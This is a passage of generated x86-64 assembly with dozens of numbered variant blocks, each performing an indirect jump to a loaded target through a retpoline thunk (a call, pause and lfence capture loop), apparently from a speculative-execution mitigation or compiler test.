	callq	.Lgg_retpol_setup_000156
.Lgg_retpol_cap_000156:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000156
.Lgg_retpol_setup_000156:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000156:
	jmp	.Lvictim_win0_continue
## Variant 157
.Lvictim_win0_var157:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000157
	jmp	.Lgg_retpol_after_000157
.Lgg_retpol_thunk_000157:
	callq	.Lgg_retpol_setup_000157
.Lgg_retpol_cap_000157:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000157
.Lgg_retpol_setup_000157:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000157:
	jmp	.Lvictim_win0_continue
## Variant 158
.Lvictim_win0_var158:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000158
	jmp	.Lgg_retpol_after_000158
.Lgg_retpol_thunk_000158:
	callq	.Lgg_retpol_setup_000158
.Lgg_retpol_cap_000158:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000158
.Lgg_retpol_setup_000158:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000158:
	jmp	.Lvictim_win0_continue
## Variant 159
.Lvictim_win0_var159:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000159
	jmp	.Lgg_retpol_after_000159
.Lgg_retpol_thunk_000159:
	callq	.Lgg_retpol_setup_000159
.Lgg_retpol_cap_000159:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000159
.Lgg_retpol_setup_000159:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000159:
	jmp	.Lvictim_win0_continue
## Variant 160
.Lvictim_win0_var160:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000160
	jmp	.Lgg_retpol_after_000160
.Lgg_retpol_thunk_000160:
	callq	.Lgg_retpol_setup_000160
.Lgg_retpol_cap_000160:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000160
.Lgg_retpol_setup_000160:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000160:
	jmp	.Lvictim_win0_continue
## Variant 161
.Lvictim_win0_var161:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000161
	jmp	.Lgg_retpol_after_000161
.Lgg_retpol_thunk_000161:
	callq	.Lgg_retpol_setup_000161
.Lgg_retpol_cap_000161:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000161
.Lgg_retpol_setup_000161:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000161:
	jmp	.Lvictim_win0_continue
## Variant 162
.Lvictim_win0_var162:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000162
	jmp	.Lgg_retpol_after_000162
.Lgg_retpol_thunk_000162:
	callq	.Lgg_retpol_setup_000162
.Lgg_retpol_cap_000162:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000162
.Lgg_retpol_setup_000162:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000162:
	jmp	.Lvictim_win0_continue
## Variant 163
.Lvictim_win0_var163:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000163
	jmp	.Lgg_retpol_after_000163
.Lgg_retpol_thunk_000163:
	callq	.Lgg_retpol_setup_000163
.Lgg_retpol_cap_000163:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000163
.Lgg_retpol_setup_000163:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000163:
	jmp	.Lvictim_win0_continue
## Variant 164
.Lvictim_win0_var164:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000164
	jmp	.Lgg_retpol_after_000164
.Lgg_retpol_thunk_000164:
	callq	.Lgg_retpol_setup_000164
.Lgg_retpol_cap_000164:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000164
.Lgg_retpol_setup_000164:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000164:
	jmp	.Lvictim_win0_continue
## Variant 165
.Lvictim_win0_var165:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000165
	jmp	.Lgg_retpol_after_000165
.Lgg_retpol_thunk_000165:
	callq	.Lgg_retpol_setup_000165
.Lgg_retpol_cap_000165:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000165
.Lgg_retpol_setup_000165:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000165:
	jmp	.Lvictim_win0_continue
## Variant 166
.Lvictim_win0_var166:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000166
	jmp	.Lgg_retpol_after_000166
.Lgg_retpol_thunk_000166:
	callq	.Lgg_retpol_setup_000166
.Lgg_retpol_cap_000166:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000166
.Lgg_retpol_setup_000166:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000166:
	jmp	.Lvictim_win0_continue
## Variant 167
.Lvictim_win0_var167:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000167
	jmp	.Lgg_retpol_after_000167
.Lgg_retpol_thunk_000167:
	callq	.Lgg_retpol_setup_000167
.Lgg_retpol_cap_000167:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000167
.Lgg_retpol_setup_000167:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000167:
	jmp	.Lvictim_win0_continue
## Variant 168
.Lvictim_win0_var168:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000168
	jmp	.Lgg_retpol_after_000168
.Lgg_retpol_thunk_000168:
	callq	.Lgg_retpol_setup_000168
.Lgg_retpol_cap_000168:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000168
.Lgg_retpol_setup_000168:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000168:
	jmp	.Lvictim_win0_continue
## Variant 169
.Lvictim_win0_var169:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000169
	jmp	.Lgg_retpol_after_000169
.Lgg_retpol_thunk_000169:
	callq	.Lgg_retpol_setup_000169
.Lgg_retpol_cap_000169:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000169
.Lgg_retpol_setup_000169:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000169:
	jmp	.Lvictim_win0_continue
## Variant 170
.Lvictim_win0_var170:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000170
	jmp	.Lgg_retpol_after_000170
.Lgg_retpol_thunk_000170:
	callq	.Lgg_retpol_setup_000170
.Lgg_retpol_cap_000170:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000170
.Lgg_retpol_setup_000170:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000170:
	jmp	.Lvictim_win0_continue
## Variant 171
.Lvictim_win0_var171:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000171
	jmp	.Lgg_retpol_after_000171
.Lgg_retpol_thunk_000171:
	callq	.Lgg_retpol_setup_000171
.Lgg_retpol_cap_000171:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000171
.Lgg_retpol_setup_000171:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000171:
	jmp	.Lvictim_win0_continue
## Variant 172
.Lvictim_win0_var172:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000172
	jmp	.Lgg_retpol_after_000172
.Lgg_retpol_thunk_000172:
	callq	.Lgg_retpol_setup_000172
.Lgg_retpol_cap_000172:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000172
.Lgg_retpol_setup_000172:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000172:
	jmp	.Lvictim_win0_continue
## Variant 173
.Lvictim_win0_var173:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000173
	jmp	.Lgg_retpol_after_000173
.Lgg_retpol_thunk_000173:
	callq	.Lgg_retpol_setup_000173
.Lgg_retpol_cap_000173:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000173
.Lgg_retpol_setup_000173:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000173:
	jmp	.Lvictim_win0_continue
## Variant 174
.Lvictim_win0_var174:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000174
	jmp	.Lgg_retpol_after_000174
.Lgg_retpol_thunk_000174:
	callq	.Lgg_retpol_setup_000174
.Lgg_retpol_cap_000174:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000174
.Lgg_retpol_setup_000174:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000174:
	jmp	.Lvictim_win0_continue
## Variant 175
.Lvictim_win0_var175:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000175
	jmp	.Lgg_retpol_after_000175
.Lgg_retpol_thunk_000175:
	callq	.Lgg_retpol_setup_000175
.Lgg_retpol_cap_000175:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000175
.Lgg_retpol_setup_000175:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000175:
	jmp	.Lvictim_win0_continue
## Variant 176
.Lvictim_win0_var176:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000176
	jmp	.Lgg_retpol_after_000176
.Lgg_retpol_thunk_000176:
	callq	.Lgg_retpol_setup_000176
.Lgg_retpol_cap_000176:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000176
.Lgg_retpol_setup_000176:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000176:
	jmp	.Lvictim_win0_continue
## Variant 177
.Lvictim_win0_var177:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000177
	jmp	.Lgg_retpol_after_000177
.Lgg_retpol_thunk_000177:
	callq	.Lgg_retpol_setup_000177
.Lgg_retpol_cap_000177:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000177
.Lgg_retpol_setup_000177:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000177:
	jmp	.Lvictim_win0_continue
## Variant 178
.Lvictim_win0_var178:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000178
	jmp	.Lgg_retpol_after_000178
.Lgg_retpol_thunk_000178:
	callq	.Lgg_retpol_setup_000178
.Lgg_retpol_cap_000178:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000178
.Lgg_retpol_setup_000178:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000178:
	jmp	.Lvictim_win0_continue
## Variant 179
.Lvictim_win0_var179:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000179
	jmp	.Lgg_retpol_after_000179
.Lgg_retpol_thunk_000179:
	callq	.Lgg_retpol_setup_000179
.Lgg_retpol_cap_000179:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000179
.Lgg_retpol_setup_000179:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000179:
	jmp	.Lvictim_win0_continue
## Variant 180
.Lvictim_win0_var180:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000180
	jmp	.Lgg_retpol_after_000180
.Lgg_retpol_thunk_000180:
	callq	.Lgg_retpol_setup_000180
.Lgg_retpol_cap_000180:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000180
.Lgg_retpol_setup_000180:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000180:
	jmp	.Lvictim_win0_continue
## Variant 181
.Lvictim_win0_var181:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000181
	jmp	.Lgg_retpol_after_000181
.Lgg_retpol_thunk_000181:
	callq	.Lgg_retpol_setup_000181
.Lgg_retpol_cap_000181:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000181
.Lgg_retpol_setup_000181:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000181:
	jmp	.Lvictim_win0_continue
## Variant 182
.Lvictim_win0_var182:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000182
	jmp	.Lgg_retpol_after_000182
.Lgg_retpol_thunk_000182:
	callq	.Lgg_retpol_setup_000182
.Lgg_retpol_cap_000182:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000182
.Lgg_retpol_setup_000182:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000182:
	jmp	.Lvictim_win0_continue
## Variant 183
.Lvictim_win0_var183:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000183
	jmp	.Lgg_retpol_after_000183
.Lgg_retpol_thunk_000183:
	callq	.Lgg_retpol_setup_000183
.Lgg_retpol_cap_000183:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000183
.Lgg_retpol_setup_000183:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000183:
	jmp	.Lvictim_win0_continue
## Variant 184
.Lvictim_win0_var184:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000184
	jmp	.Lgg_retpol_after_000184
.Lgg_retpol_thunk_000184:
	callq	.Lgg_retpol_setup_000184
.Lgg_retpol_cap_000184:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000184
.Lgg_retpol_setup_000184:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000184:
	jmp	.Lvictim_win0_continue
## Variant 185
.Lvictim_win0_var185:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000185
	jmp	.Lgg_retpol_after_000185
.Lgg_retpol_thunk_000185:
	callq	.Lgg_retpol_setup_000185
.Lgg_retpol_cap_000185:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000185
.Lgg_retpol_setup_000185:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000185:
	jmp	.Lvictim_win0_continue
## Variant 186
.Lvictim_win0_var186:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000186
	jmp	.Lgg_retpol_after_000186
.Lgg_retpol_thunk_000186:
	callq	.Lgg_retpol_setup_000186
.Lgg_retpol_cap_000186:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000186
.Lgg_retpol_setup_000186:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000186:
	jmp	.Lvictim_win0_continue
## Variant 187
.Lvictim_win0_var187:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000187
	jmp	.Lgg_retpol_after_000187
.Lgg_retpol_thunk_000187:
	callq	.Lgg_retpol_setup_000187
.Lgg_retpol_cap_000187:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000187
.Lgg_retpol_setup_000187:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000187:
	jmp	.Lvictim_win0_continue
## Variant 188
.Lvictim_win0_var188:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000188
	jmp	.Lgg_retpol_after_000188
.Lgg_retpol_thunk_000188:
	callq	.Lgg_retpol_setup_000188
.Lgg_retpol_cap_000188:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000188
.Lgg_retpol_setup_000188:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000188:
	jmp	.Lvictim_win0_continue
## Variant 189
.Lvictim_win0_var189:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000189
	jmp	.Lgg_retpol_after_000189
.Lgg_retpol_thunk_000189:
	callq	.Lgg_retpol_setup_000189
.Lgg_retpol_cap_000189:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000189
.Lgg_retpol_setup_000189:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000189:
	jmp	.Lvictim_win0_continue
## Variant 190
.Lvictim_win0_var190:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000190
	jmp	.Lgg_retpol_after_000190
.Lgg_retpol_thunk_000190:
	callq	.Lgg_retpol_setup_000190
.Lgg_retpol_cap_000190:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000190
.Lgg_retpol_setup_000190:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000190:
	jmp	.Lvictim_win0_continue
## Variant 191
.Lvictim_win0_var191:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000191
	jmp	.Lgg_retpol_after_000191
.Lgg_retpol_thunk_000191:
	callq	.Lgg_retpol_setup_000191
.Lgg_retpol_cap_000191:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000191
.Lgg_retpol_setup_000191:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000191:
	jmp	.Lvictim_win0_continue
## Variant 192
.Lvictim_win0_var192:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000192
	jmp	.Lgg_retpol_after_000192
.Lgg_retpol_thunk_000192:
	callq	.Lgg_retpol_setup_000192
.Lgg_retpol_cap_000192:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000192
.Lgg_retpol_setup_000192:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000192:
	jmp	.Lvictim_win0_continue
## Variant 193
.Lvictim_win0_var193:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000193
	jmp	.Lgg_retpol_after_000193
.Lgg_retpol_thunk_000193:
	callq	.Lgg_retpol_setup_000193
.Lgg_retpol_cap_000193:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000193
.Lgg_retpol_setup_000193:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000193:
	jmp	.Lvictim_win0_continue
## Variant 194
.Lvictim_win0_var194:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000194
	jmp	.Lgg_retpol_after_000194
.Lgg_retpol_thunk_000194:
	callq	.Lgg_retpol_setup_000194
.Lgg_retpol_cap_000194:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000194
.Lgg_retpol_setup_000194:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000194:
	jmp	.Lvictim_win0_continue
## Variant 195
.Lvictim_win0_var195:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000195
	jmp	.Lgg_retpol_after_000195
.Lgg_retpol_thunk_000195:
	callq	.Lgg_retpol_setup_000195
.Lgg_retpol_cap_000195:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000195
.Lgg_retpol_setup_000195:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000195:
	jmp	.Lvictim_win0_continue
## Variant 196
.Lvictim_win0_var196:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000196
	jmp	.Lgg_retpol_after_000196
.Lgg_retpol_thunk_000196:
	callq	.Lgg_retpol_setup_000196
.Lgg_retpol_cap_000196:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000196
.Lgg_retpol_setup_000196:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000196:
	jmp	.Lvictim_win0_continue
## Variant 197
.Lvictim_win0_var197:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000197
	jmp	.Lgg_retpol_after_000197
.Lgg_retpol_thunk_000197:
	callq	.Lgg_retpol_setup_000197
.Lgg_retpol_cap_000197:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000197
.Lgg_retpol_setup_000197:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000197:
	jmp	.Lvictim_win0_continue
## Variant 198
.Lvictim_win0_var198:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000198
	jmp	.Lgg_retpol_after_000198
.Lgg_retpol_thunk_000198:
	callq	.Lgg_retpol_setup_000198
.Lgg_retpol_cap_000198:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000198
.Lgg_retpol_setup_000198:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000198:
	jmp	.Lvictim_win0_continue
## Variant 199
.Lvictim_win0_var199:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000199
	jmp	.Lgg_retpol_after_000199
.Lgg_retpol_thunk_000199:
	callq	.Lgg_retpol_setup_000199
.Lgg_retpol_cap_000199:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000199
.Lgg_retpol_setup_000199:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000199:
	jmp	.Lvictim_win0_continue
## Variant 200
.Lvictim_win0_var200:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000200
	jmp	.Lgg_retpol_after_000200
.Lgg_retpol_thunk_000200:
	callq	.Lgg_retpol_setup_000200
.Lgg_retpol_cap_000200:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000200
.Lgg_retpol_setup_000200:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000200:
	jmp	.Lvictim_win0_continue
## Variant 201
.Lvictim_win0_var201:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000201
	jmp	.Lgg_retpol_after_000201
.Lgg_retpol_thunk_000201:
	callq	.Lgg_retpol_setup_000201
.Lgg_retpol_cap_000201:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000201
.Lgg_retpol_setup_000201:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000201:
	jmp	.Lvictim_win0_continue
## Variant 202
.Lvictim_win0_var202:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000202
	jmp	.Lgg_retpol_after_000202
.Lgg_retpol_thunk_000202:
	callq	.Lgg_retpol_setup_000202
.Lgg_retpol_cap_000202:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000202
.Lgg_retpol_setup_000202:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000202:
	jmp	.Lvictim_win0_continue
## Variant 203
.Lvictim_win0_var203:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000203
	jmp	.Lgg_retpol_after_000203
.Lgg_retpol_thunk_000203:
	callq	.Lgg_retpol_setup_000203
.Lgg_retpol_cap_000203:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000203
.Lgg_retpol_setup_000203:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000203:
	jmp	.Lvictim_win0_continue
## Variant 204
.Lvictim_win0_var204:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000204
	jmp	.Lgg_retpol_after_000204
.Lgg_retpol_thunk_000204:
	callq	.Lgg_retpol_setup_000204
.Lgg_retpol_cap_000204:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000204
.Lgg_retpol_setup_000204:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000204:
	jmp	.Lvictim_win0_continue
## Variant 205
.Lvictim_win0_var205:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000205
	jmp	.Lgg_retpol_after_000205
.Lgg_retpol_thunk_000205:
	callq	.Lgg_retpol_setup_000205
.Lgg_retpol_cap_000205:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000205
.Lgg_retpol_setup_000205:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000205:
	jmp	.Lvictim_win0_continue
## Variant 206
.Lvictim_win0_var206:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000206
	jmp	.Lgg_retpol_after_000206
.Lgg_retpol_thunk_000206:
	callq	.Lgg_retpol_setup_000206
.Lgg_retpol_cap_000206:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000206
.Lgg_retpol_setup_000206:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000206:
	jmp	.Lvictim_win0_continue
## Variant 207
.Lvictim_win0_var207:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000207
	jmp	.Lgg_retpol_after_000207
.Lgg_retpol_thunk_000207:
	callq	.Lgg_retpol_setup_000207
.Lgg_retpol_cap_000207:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000207
.Lgg_retpol_setup_000207:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000207:
	jmp	.Lvictim_win0_continue
## Variant 208
.Lvictim_win0_var208:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000208
	jmp	.Lgg_retpol_after_000208
.Lgg_retpol_thunk_000208:
	callq	.Lgg_retpol_setup_000208
.Lgg_retpol_cap_000208:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000208
